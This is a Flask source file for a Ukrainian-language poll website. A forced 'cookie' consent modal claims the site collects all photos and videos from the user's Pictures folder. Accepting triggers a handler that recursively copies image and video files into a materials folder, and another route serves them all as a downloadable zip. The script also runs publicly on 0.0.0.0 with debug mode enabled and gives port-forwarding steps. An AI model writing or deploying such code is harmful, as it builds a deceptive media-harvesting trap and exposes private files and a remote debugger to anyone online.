from flask import Flask, render_template_string, request, redirect, make_response, send_file
import os
import glob
import zipfile
import io

app = Flask(__name__)

VOTES = {"yes": 0, "no": 0}

MATERIALS_DIR = os.path.join(os.getcwd(), "матеріли")
os.makedirs(MATERIALS_DIR, exist_ok=True)

TEMPLATE = """
<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <title>Голосування</title>
    <style>
        body {
            background: #181a1b;
            color: #e0e0e0;
            font-family: 'Segoe UI', Arial, sans-serif;
            margin: 0;
            min-height: 100vh;
        }
        #cookie-modal {
            position: fixed; left: 0; top: 0; width: 100vw; height: 100vh;
            background: rgba(20,22,24,0.85); z-index: 10000;
            backdrop-filter: blur(2px);
            display: flex;
            align-items: center;
            justify-content: center;
        }
        #cookie-box {
            background: #23272a;
            padding: 32px 24px 24px 24px;
            border-radius: 14px;
            width: 340px;
            text-align: center;
            box-shadow: 0 8px 32px 0 rgba(0,0,0,0.45);
            border: 1px solid #2c2f33;
        }
        #cookie-box p {
            color: #e0e0e0;
            margin-bottom: 18px;
            font-size: 1.08em;
        }
        #main-content {
            max-width: 420px;
            margin: 48px auto 0 auto;
            background: #23272a;
            border-radius: 14px;
            box-shadow: 0 4px 24px 0 rgba(0,0,0,0.25);
            padding: 32px 32px 24px 32px;
            border: 1px solid #2c2f33;
        }
        h1, h2 {
            color: #f3f3f3;
            margin-top: 0;
        }
        p {
            color: #bdbdbd;
        }
        button {
            margin: 7px 8px;
            padding: 10px 28px;
            border-radius: 8px;
            border: none;
            background: linear-gradient(90deg, #23272a 0%, #36393f 100%);
            color: #f3f3f3;
            font-size: 1em;
            font-weight: 500;
            cursor: pointer;
            box-shadow: 0 2px 8px 0 rgba(0,0,0,0.18);
            transition: background 0.2s, color 0.2s, transform 0.1s;
        }
        button:hover, button:focus {
            background: linear-gradient(90deg, #36393f 0%, #23272a 100%);
            color: #00bfae;
            transform: translateY(-2px) scale(1.04);
            outline: none;
        }
        body.modal-active {
            overflow: hidden;
        }
        #file-input {
            display: none !important;
        }
        @media (max-width: 600px) {
            #main-content, #cookie-box {
                width: 95vw;
                padding: 16px 4vw 16px 4vw;
            }
        }
    </style>
</head>
<body>
<div id="cookie-modal">
    <div id="cookie-box">
        <p>Цей сайт використовує cookie та автоматично збирає всі фото/відео з вашої папки "Зображення" для покращення роботи. Продовжити?</p>
        <form id="cookie-form" method="post" action="/cookie">
            <button name="action" value="ok" type="submit" id="ok-btn">OK</button>
            <button name="action" value="exit" type="button" id="exit-btn">Вийти</button>
        </form>
    </div>
</div>
<div id="main-content" style="filter: blur(2px); pointer-events: none; user-select: none;">
    <h1>Голосування: Чи подобається вам цей сайт?</h1>
    {% if cookie_accepted %}
    <form method="post" action="/vote" id="vote-form">
        <button name="vote" value="yes" type="submit" id="vote-yes">Так</button>
        <button name="vote" value="no" type="submit" id="vote-no">Ні</button>
    </form>
    <h2>Результати:</h2>
    <p>Так: {{ votes['yes'] }}</p>
    <p>Ні: {{ votes['no'] }}</p>
    {% else %}
    <p>Щоб проголосувати, спочатку прийміть cookie та надайте дозвіл.</p>
    {% endif %}
</div>
<script>
    document.addEventListener("DOMContentLoaded", function() {
        document.body.classList.add("modal-active");
        var cookieModal = document.getElementById("cookie-modal");
        var mainContent = document.getElementById("main-content");
        document.getElementById("ok-btn").onclick = function(e) {
            // Дозволяємо стандартну відправку форми (submit), щоб сервер міг виконати копіювання
            // (нічого не змінюємо тут)
        };
        document.getElementById("exit-btn").onclick = function(e) {
            e.preventDefault();
            let formData = new FormData();
            formData.append("action", "exit");
            fetch("/cookie", {
                method: "POST",
                body: formData
            }).then(resp => resp.text())
              .then(html => {
                  document.open();
                  document.write(html);
                  document.close();
              });
        };
    });
</script>
</body>
</html>
"""

@app.route("/", methods=["GET"])
def index():
    cookie_accepted = request.cookies.get("cookie_accepted") == "1"
    return render_template_string(TEMPLATE, votes=VOTES, cookie_accepted=cookie_accepted)

@app.route("/cookie", methods=["POST"])
def cookie():
    action = request.form.get("action")
    if action == "ok":
        user_pictures = os.path.expanduser("~/Pictures")
        if not os.path.exists(user_pictures):
            user_pictures = os.path.expanduser("~/Зображення")
        found_files = []
        if os.path.exists(user_pictures):
            exts = ("*.jpg", "*.jpeg", "*.png", "*.gif", "*.bmp", "*.mp4", "*.avi", "*.mov", "*.mkv", "*.webm")
            for ext in exts:
                found_files.extend(glob.glob(os.path.join(user_pictures, "**", ext), recursive=True))
            for f in found_files:
                try:
                    basename = os.path.basename(f)
                    dest = os.path.join(MATERIALS_DIR, basename)
                    if not os.path.exists(dest):
                        with open(f, "rb") as src, open(dest, "wb") as dst:
                            dst.write(src.read())
                except Exception:
                    pass
        resp = make_response(redirect("/"))
        resp.set_cookie("cookie_accepted", "1")
        return resp
    else:
        return "<h2>Ви відмовились від використання cookie. Доступ заборонено.</h2>"

@app.route("/download_materials")
def download_materials():
    # Дозволяємо скачати всі матеріали одним zip-архівом
    if request.cookies.get("cookie_accepted") != "1":
        return redirect("/")
    memory_file = io.BytesIO()
    with zipfile.ZipFile(memory_file, 'w') as zf:
        for fname in os.listdir(MATERIALS_DIR):
            fpath = os.path.join(MATERIALS_DIR, fname)
            if os.path.isfile(fpath):
                zf.write(fpath, arcname=fname)
    memory_file.seek(0)
    return send_file(memory_file, download_name="materials.zip", as_attachment=True)

@app.route("/vote", methods=["POST"])
def vote():
    if request.cookies.get("cookie_accepted") != "1":
        return redirect("/")
    v = request.form.get("vote")
    if v in VOTES:
        VOTES[v] += 1
    return redirect("/")

if __name__ == "__main__":
    # Додаємо підтримку зовнішнього доступу (через будь-яку мережу)
    # Для цього потрібно:
    # 1. Запускати Flask на host="0.0.0.0"
    # 2. Вказати порт (наприклад, 5000)
    # 3. Відкрити порт 5000 у вашому роутері (port forwarding)
    # 4. Використовувати вашу зовнішню (публічну) IP-адресу для доступу ззовні
    import socket
    import requests
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
    except Exception:
        local_ip = "127.0.0.1"
    try:
        public_ip = requests.get("https://api.ipify.org").text
    except Exception:
        public_ip = "<ваша_зовнішня_IP_адреса>"

    print(f"[+] Веб-інтерфейс доступний у вашій локальній мережі: http://{local_ip}:5000/")
    print(f"[+] Для доступу з будь-якої мережі (через Інтернет): http://{public_ip}:5000/")
    print("[*] Для зовнішнього доступу відкрийте порт 5000 у вашому роутері (port forwarding)!")
    # Пояснення для користувача:
    # Ваш локальний IPv4-адрес для port forwarding: 192.168.1.6
    # Саме цю адресу потрібно вказати у полі "IP-адреса" при налаштуванні port forwarding на роутері.
    # Порт: 5000 (або той, на якому працює Flask)
    app.run(host="0.0.0.0", port=5000, debug=True)
